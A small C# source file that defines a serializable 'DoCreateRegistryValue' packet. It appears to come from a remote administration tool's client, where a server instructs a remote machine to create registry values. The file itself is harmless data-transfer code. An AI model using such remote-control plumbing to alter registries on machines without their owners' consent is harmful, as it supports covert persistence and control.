using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoCreateRegistryValue : IPacket
    {
        public string KeyPath { get; set; }
        public RegistryValueKind Kind { get; set; }

        public DoCreateRegistryValue(string keyPath, RegistryValueKind kind)
        {
            KeyPath = keyPath;
            Kind = kind;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
